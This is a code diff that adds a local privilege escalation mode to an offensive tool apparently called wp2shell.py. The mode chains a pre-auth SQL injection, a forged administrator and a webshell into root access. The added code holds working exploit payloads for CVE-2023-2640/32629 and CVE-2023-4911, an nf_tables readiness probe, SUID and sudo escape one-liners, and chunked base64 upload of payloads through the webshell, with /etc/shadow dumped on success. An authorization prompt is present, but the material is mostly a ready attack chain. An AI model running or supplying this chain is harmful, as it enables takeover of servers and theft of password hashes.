@@ -17,6 +17,10 @@
 #   --rce    <url> --cmd id                          credential-less pre-auth RCE
 #   --rce    <url> -i                                credential-less RCE, interactive shell
 #   --root-prereq <url> --password <cracked>         benign LPE prereq check
+#   --lpe    <url>                                   pre-auth RCE + LPE chain
+#                                                    (CVE-2023-2640/32629,
+#                                                     CVE-2023-4911,
+#                                                     CVE-2024-1086)
 #
 # Python standard library only.
 import argparse
@@ -1209,9 +1213,370 @@ def cmd_rce(args):
 
 
 # ==========================================================================
+# lpe — local privilege escalation chain (post-webshell)
+# Runs after the pre-auth RCE chain establishes a www-data webshell.
+# Attempts in order:
+#   1. CVE-2023-2640 / CVE-2023-32629  GameOverlay overlayfs (Ubuntu 22.04)
+#   2. CVE-2023-4911                   Looney Tunables glibc (Ubuntu/Debian/Fedora)
+#   3. CVE-2024-1086                   nf_tables UAF prerequisite probe
+#   4. SUID / sudo NOPASSWD / capabilities fallback
+#
+# Research references:
+#   CVE-2023-2640/32629: g1vi/CVE-2023-2640-2023-32629 (overlayfs + GameOverlay)
+#   CVE-2023-4911:       Qualys QSA-2023-0015 / leesh3288/CVE-2023-4911
+#   CVE-2024-1086:       notselwyn/CVE-2024-1086 (nf_tables UAF)
+# ==========================================================================
+
+# ── CVE-2023-2640 / CVE-2023-32629  GameOverlay Ubuntu overlayfs ──────────
+# Affected: Ubuntu 22.04 / 23.04 with GameOverlay kernel driver, kernel <6.3.3.
+# Technique: an unprivileged overlay mount inside a user namespace lets the
+#   caller chmod +s a file in the overlay mount.  The SUID bit persists in
+#   the upper dir after umount — giving us a SUID root bash.
+# No compiler required.
+_LPE_GOV_SH = r"""#!/bin/sh
+t=$(mktemp -d /tmp/.gov_XXXXXXXX) || exit 99
+cd "$t" || exit 99
+mkdir -p l u w m
+cp /usr/bin/bash l/bash 2>/dev/null || { rm -rf "$t"; echo "EXPLOIT_FAILED"; exit 98; }
+unshare -rm sh -c "
+  cd \"$t\"
+  mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m 2>/dev/null
+  chmod +s m/bash 2>/dev/null
+  umount m 2>/dev/null
+" 2>/dev/null
+if [ -u u/bash ]; then
+  u/bash -p -c 'echo "[+] root via CVE-2023-2640/32629 (GameOverlay)"; id; cat /etc/shadow 2>/dev/null | head -5'
+  rm -rf "$t"
+  exit 0
+fi
+rm -rf "$t"
+echo "EXPLOIT_FAILED"
+exit 1
+"""
+
+# ── CVE-2023-4911  Looney Tunables (glibc GLIBC_TUNABLES stack overflow) ──
+# Affected: glibc 2.34-2.38 — Ubuntu 22.04 (2.35), Debian 12 (2.36),
+#           Fedora 37-38 (2.37).  Fixed in glibc >=2.38-r8 / 2.39.
+# Technique: _dl_parse_tunables() has a 512-byte fixed stack buffer for the
+#   GLIBC_TUNABLES env var.  On SUID exec the tunables are purged *after*
+#   the buffer is parsed, so we overflow to clobber the adjacent env slot to
+#   point at our LD_PRELOAD — which survives the privilege transition.
+# Requires: gcc on target.
+_LPE_LTU_C = r"""
+/* CVE-2023-4911 Looney Tunables — glibc GLIBC_TUNABLES overflow
+ * Ref: Qualys QSA-2023-0015 / leesh3288/CVE-2023-4911 */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+static const char *so_src =
+    "#define _GNU_SOURCE\n"
+    "#include <stdio.h>\n"
+    "#include <stdlib.h>\n"
+    "#include <unistd.h>\n"
+    "__attribute__((constructor)) void p(void){\n"
+    "  setresuid(0,0,0); setresgid(0,0,0);\n"
+    "  puts(\"[+] root via CVE-2023-4911 (Looney Tunables)\");\n"
+    "  system(\"id; cat /etc/shadow 2>/dev/null | head -5\");\n"
+    "  _exit(0);\n"
+    "}\n";
+
+int main(void) {
+    char cp[64], sp[64], cm[256];
+    snprintf(cp, sizeof cp, "/tmp/.ltu_%d.c",  (int)getpid());
+    snprintf(sp, sizeof sp, "/tmp/.ltu_%d.so", (int)getpid());
+
+    FILE *f = fopen(cp, "w");
+    if (!f) { perror("fopen"); return 1; }
+    fputs(so_src, f);
+    fclose(f);
+
+    snprintf(cm, sizeof cm,
+        "gcc -fPIC -shared -nostartfiles -o %s %s 2>&1", sp, cp);
+    if (system(cm) != 0) {
+        printf("[-] gcc failed\n");
+        unlink(cp);
+        return 1;
+    }
+    unlink(cp);
+
+    /* build 512-byte GLIBC_TUNABLES overflow, followed by our LD_PRELOAD */
+    char tun[600];
+    const char *pfx = "GLIBC_TUNABLES=glibc.malloc.mxfast=";
+    memset(tun, 0, sizeof tun);
+    strncpy(tun, pfx, sizeof tun - 1);
+    memset(tun + strlen(pfx), 'A', 512 - strlen(pfx));
+
+    char ldp[128];
+    snprintf(ldp, sizeof ldp, "LD_PRELOAD=%s", sp);
+
+    char *e[] = { tun, ldp, NULL };
+    char *v[] = { "/usr/bin/su", NULL };
+    printf("[cve-2023-4911] overflow trigger via /usr/bin/su ...\n");
+    fflush(stdout);
+    execve("/usr/bin/su", v, e);
+    perror("execve");
+    unlink(sp);
+    return 1;
+}
+"""
+
+# ── CVE-2024-1086  nf_tables use-after-free prerequisite probe ────────────
+# Affected: upstream kernel 5.14.21 – 6.6.14 / 6.7.2 (nft_verdict_init UAF).
+# This stub checks whether user namespaces + NETLINK_NETFILTER are accessible
+# (required preconditions for the full UAF chain).
+# Full exploit: https://github.com/notselwyn/CVE-2024-1086
+# Requires: gcc on target.
+_LPE_NFT_C = r"""
+/* CVE-2024-1086 nf_tables UAF prerequisite probe
+ * Full exploit: notselwyn/CVE-2024-1086 */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <sched.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <linux/netlink.h>
+
+int main(void) {
+    puts("[cve-2024-1086] checking prerequisites...");
+    fflush(stdout);
+    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
+        perror("unshare");
+        puts("[-] user namespaces not permitted (sysctl kernel.unprivileged_userns_clone=0 ?)");
+        return 1;
+    }
+    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+    if (fd < 0) {
+        perror("socket(NETLINK_NETFILTER)");
+        puts("[-] nf_tables not accessible in user namespace");
+        return 1;
+    }
+    close(fd);
+    puts("[+] nf_tables reachable in user namespace — kernel likely VULNERABLE");
+    puts("[!] upload and run the full exploit: https://github.com/notselwyn/CVE-2024-1086");
+    return 0;
+}
+"""
+
+# GTFOBins SUID paths → one-shot id command (non-interactive verification)
+_SUID_GTF = {
+    "/usr/bin/find":    "find . -exec /bin/sh -p -c id \\; -quit 2>/dev/null",
+    "/usr/bin/python3": "python3 -c 'import os;os.setuid(0);os.system(\"id\")' 2>/dev/null",
+    "/usr/bin/python":  "python -c 'import os;os.setuid(0);os.system(\"id\")' 2>/dev/null",
+    "/usr/bin/perl":    "perl -e 'use POSIX;setuid(0);exec \"id\"' 2>/dev/null",
+    "/usr/bin/ruby":    "ruby -e 'Process::Sys.setuid(0);exec \"id\"' 2>/dev/null",
+    "/usr/bin/awk":     "awk 'BEGIN{setuid(0);system(\"id\")}' 2>/dev/null",
+    "/usr/bin/env":     "env /bin/sh -p -c id 2>/dev/null",
+    "/usr/bin/node":    "node -e 'require(\"child_process\").exec(\"id\",(_,o)=>process.stdout.write(o))' 2>/dev/null",
+    "/usr/bin/php":     "php -r 'posix_setuid(0);system(\"id\");' 2>/dev/null",
+    "/bin/bash":        "bash -p -c id 2>/dev/null",
+    "/usr/bin/bash":    "bash -p -c id 2>/dev/null",
+    "/usr/bin/vim.basic": "vim -c ':py3 import os;os.setuid(0);os.system(\"id\")' -c q 2>/dev/null",
+}
+
+
+def _lpe_write(run_fn, content, remote_path, executable=False):
+    """Transfer content to remote_path via the webshell using base64."""
+    enc = base64.b64encode(content.encode()).decode()
+    chunk = 2800
+    run_fn("echo '%s' | base64 -d > %s" % (enc[:chunk], remote_path))
+    for i in range(chunk, len(enc), chunk):
+        run_fn("echo '%s' | base64 -d >> %s" % (enc[i:i + chunk], remote_path))
+    if executable:
+        run_fn("chmod +x %s" % remote_path)
+
+
+def _lpe_try_suid(run_fn, suid_output):
+    hits = []
+    for line in (suid_output or "").splitlines():
+        path = line.strip()
+        if path in _SUID_GTF:
+            out = (run_fn(_SUID_GTF[path]) or "").strip()
+            if out and "uid=0" in out:
+                hits.append("[+] SUID escalation via %s: %s" % (path, out.split("\n")[0][:100]))
+    return hits
+
+
+def _lpe_try_sudo(run_fn, sudo_output):
+    hits = []
+    if "NOPASSWD" not in (sudo_output or ""):
+        return hits
+    for line in sudo_output.splitlines():
+        if "NOPASSWD" not in line:
+            continue
+        for binary in ("/bin/bash", "/usr/bin/bash", "/bin/sh", "/usr/bin/sh"):
+            if binary in line:
+                out = (run_fn("sudo %s -p -c id 2>/dev/null" % binary) or "").strip()
+                if out and "uid=0" in out:
+                    hits.append("[+] sudo NOPASSWD escalation via %s: %s" % (binary, out))
+        if "(ALL" in line and "ALL" in line.split("NOPASSWD")[-1]:
+            out = (run_fn("sudo /bin/sh -c id 2>/dev/null") or "").strip()
+            if out and "uid=0" in out:
+                hits.append("[+] sudo (ALL) NOPASSWD: %s" % out)
+    return hits
+
+
+def _cmd_lpe_inner(run_fn):
+    """Run the LPE chain using the supplied webshell run callable."""
+    def rn(cmd):
+        return (run_fn(cmd) or "").strip()
+
+    # ── enumeration ─────────────────────────────────────────────────────────
+    sys.stderr.write("[lpe 2/7] enumerating target ...\n")
+    kernel  = rn("uname -r")
+    distro  = rn("lsb_release -d 2>/dev/null | cut -d: -f2 || "
+                 "grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 || true")
+    glibc   = rn("ldd --version 2>/dev/null | head -1 || true")
+    whoami  = rn("id")
+    gcc_ok  = rn("which gcc 2>/dev/null")
+    userns  = rn("cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || echo unknown")
+    sudo_l  = rn("sudo -l 2>/dev/null || true")
+    suid    = rn("find /usr /bin /sbin -xdev -perm -4000 -user root -type f 2>/dev/null | head -30")
+    caps    = rn("getcap -r / 2>/dev/null | head -20 || true")
+
+    print("\n[lpe] system enumeration:")
+    print("      kernel  : %s" % kernel)
+    print("      distro  : %s" % distro.strip().strip('"'))
+    print("      glibc   : %s" % glibc)
+    print("      id      : %s" % whoami)
+    print("      gcc     : %s" % (gcc_ok or "not found"))
+    print("      userns  : %s" % userns)
+    if sudo_l:
+        for ln in sudo_l.splitlines()[:4]:
+            print("      sudo-l  : %s" % ln.strip())
+    print()
+
+    # ── CVE-2023-2640 / CVE-2023-32629  GameOverlay ─────────────────────────
+    sys.stderr.write("[lpe 3/7] trying CVE-2023-2640/32629 (GameOverlay overlayfs) ...\n")
+    _lpe_write(run_fn, _LPE_GOV_SH, "/tmp/.lpe_gov.sh", executable=True)
+    gov_out = rn("sh /tmp/.lpe_gov.sh 2>&1; rm -f /tmp/.lpe_gov.sh")
+    if gov_out and "[+]" in gov_out:
+        print("[+] LPE SUCCESS via CVE-2023-2640/32629 (GameOverlay overlayfs):\n")
+        print(gov_out)
+        return 0
+    fail_line = gov_out.split("\n")[0] if gov_out else "no output"
+    print("[-] CVE-2023-2640/32629 not applicable: %s" % fail_line)
+
+    # ── CVE-2023-4911  Looney Tunables ──────────────────────────────────────
+    sys.stderr.write("[lpe 4/7] trying CVE-2023-4911 (Looney Tunables glibc) ...\n")
+    if not gcc_ok:
+        print("[-] CVE-2023-4911: gcc not on target PATH, skipping")
+    else:
+        _lpe_write(run_fn, _LPE_LTU_C.strip(), "/tmp/.lpe_ltu.c")
+        compile_out = rn("gcc -o /tmp/.lpe_ltu /tmp/.lpe_ltu.c 2>&1; rm -f /tmp/.lpe_ltu.c")
+        if compile_out:
+            print("[-] CVE-2023-4911 compile error: %s" % compile_out[:200])
+        else:
+            ltu_out = rn("/tmp/.lpe_ltu 2>&1; rm -f /tmp/.lpe_ltu /tmp/.ltu_*.so 2>/dev/null")
+            if ltu_out and "[+]" in ltu_out:
+                print("[+] LPE SUCCESS via CVE-2023-4911 (Looney Tunables):\n")
+                print(ltu_out)
+                return 0
+            fail_line = ltu_out.split("\n")[0] if ltu_out else "no output"
+            print("[-] CVE-2023-4911 not applicable: %s" % fail_line)
+
+    # ── CVE-2024-1086  nf_tables prerequisite probe ─────────────────────────
+    sys.stderr.write("[lpe 5/7] probing CVE-2024-1086 (nf_tables UAF) prerequisites ...\n")
+    if not gcc_ok:
+        print("[-] CVE-2024-1086: gcc not on target PATH, skipping probe")
+    else:
+        _lpe_write(run_fn, _LPE_NFT_C.strip(), "/tmp/.lpe_nft.c")
+        nft_compile = rn("gcc -o /tmp/.lpe_nft /tmp/.lpe_nft.c 2>&1; rm -f /tmp/.lpe_nft.c")
+        if nft_compile:
+            print("[-] CVE-2024-1086 probe compile error: %s" % nft_compile[:200])
+        else:
+            nft_out = rn("/tmp/.lpe_nft 2>&1; rm -f /tmp/.lpe_nft")
+            for ln in (nft_out or "").splitlines():
+                print("    %s" % ln)
+            if "VULNERABLE" in (nft_out or ""):
+                print("[!] kernel appears vulnerable — compile and upload:")
+                print("    https://github.com/notselwyn/CVE-2024-1086")
+
+    # ── SUID / sudo / capabilities fallback ─────────────────────────────────
+    sys.stderr.write("[lpe 6/7] SUID / sudo NOPASSWD / capabilities fallback ...\n")
+    suid_hits = _lpe_try_suid(run_fn, suid)
+    sudo_hits = _lpe_try_sudo(run_fn, sudo_l)
+
+    if suid_hits or sudo_hits:
+        sys.stderr.write("[lpe 7/7] fallback escalation path found:\n")
+        for line in suid_hits + sudo_hits:
+            print("    %s" % line)
+        return 0
+
+    if caps:
+        print("[*] capabilities found (may enable manual escalation):")
+        for ln in caps.splitlines():
+            if ln.strip():
+                print("    %s" % ln)
+
+    sys.stderr.write("[lpe 7/7] no automatic path found\n")
+    print("\n[-] no automatic LPE path succeeded on this target.")
+    print("    CVE-2023-2640/32629 requires Ubuntu 22.04 kernel <6.3.3 + GameOverlay.")
+    print("    CVE-2023-4911 requires glibc 2.34-2.38 + /usr/bin/su SUID.")
+    print("    CVE-2024-1086 requires kernel 5.14.21-6.6.14 + unprivileged userns.")
+    return 1
+
+
+def cmd_lpe(args):
+    """Credential-less pre-auth LPE: SQLi → admin forge → webshell → root."""
+    url = args.url if "://" in args.url else "http://" + args.url
+    if not _is_local(url) and not args.authorized:
+        print("[-] refusing remote target without --authorized.\n"
+              "    Only test assets you own or are explicitly authorized to test.",
+              file=sys.stderr)
+        return 2
+
+    t = PreAuthRCE(url, timeout=max(args.timeout, 30),
+                   proxy=getattr(args, "proxy", None),
+                   sleep=args.sleep, route=args.route)
+
+    sys.stderr.write("[*] target: %s\n" % url)
+    sys.stderr.write("[lpe 1/7] confirming blind SQLi (time-based differential) ...\n")
+    try:
+        det = t.detect(rounds=args.rounds)
+    except urllib.error.URLError as e:
+        print("[-] %s" % e.reason)
+        return 2
+    if not det["vulnerable"]:
+        print("[-] SQLi not confirmed (fast=%.3fs slow=%.3fs)"
+              % (det["fast"], det["slow"]))
+        return 1
+    sys.stderr.write("[+] SQLi confirmed (fast=%.3fs slow=%.3fs)\n"
+                     % (det["fast"], det["slow"]))
+
+    if not args.yes and not _confirm_authorization(
+            url, "forge an admin, deploy a webshell, and attempt local privilege escalation"):
+        print("[-] aborted: authorization not confirmed")
+        return 2
+
+    try:
+        user, pw, run_fn, cleanup = t.deploy()
+    except (RuntimeError, urllib.error.URLError) as e:
+        print("[-] RCE chain failed: %s" % e)
+        return 2
+    print("[+] forged administrator: %s : %s" % (user, pw))
+
+    rc = 2
+    try:
+        rc = _cmd_lpe_inner(run_fn)
+    except (RuntimeError, urllib.error.URLError) as e:
+        print("[-] lpe error: %s" % e)
+    finally:
+        if args.no_cleanup:
+            sys.stderr.write("[!] --no-cleanup: webshell left in place on target\n")
+        else:
+            cleanup()
+            sys.stderr.write("[*] cleanup: removed dropped webshell plugin\n")
+    return rc
+
+
+# ==========================================================================
 MODES = {
     "scan": cmd_scan, "check": cmd_check, "read": cmd_read,
     "shell": cmd_shell, "root-prereq": cmd_root_prereq, "rce": cmd_rce,
+    "lpe": cmd_lpe,
 }
 
 
@@ -1227,7 +1592,8 @@ def main():
                "  wp2shell.py --shell http://127.0.0.1:8080 --password s3cr3t -i\n"
                "  wp2shell.py --rce http://127.0.0.1:8080 --cmd id\n"
                "  wp2shell.py --rce http://127.0.0.1:8080 -i\n"
-               "  wp2shell.py --root-prereq http://127.0.0.1:8080 --password s3cr3t",
+               "  wp2shell.py --root-prereq http://127.0.0.1:8080 --password s3cr3t\n"
+               "  wp2shell.py --lpe http://127.0.0.1:8080",
         formatter_class=argparse.RawDescriptionHelpFormatter)
 
     # mode selection: exactly one, as a flag instead of a positional subcommand
@@ -1245,6 +1611,9 @@ def main():
     mode.add_argument("--root-prereq", action="store_const", dest="mode",
                       const="root-prereq",
                       help="benign shell-to-root prerequisite check; does not run LPE")
+    mode.add_argument("--lpe", action="store_const", dest="mode", const="lpe",
+                      help="pre-auth RCE + local privilege escalation chain "
+                           "(CVE-2023-2640/32629, CVE-2023-4911, CVE-2024-1086)")
 
     ap.add_argument("targets", nargs="*",
                     help="target URL (single, for all modes) or host list (--scan)")
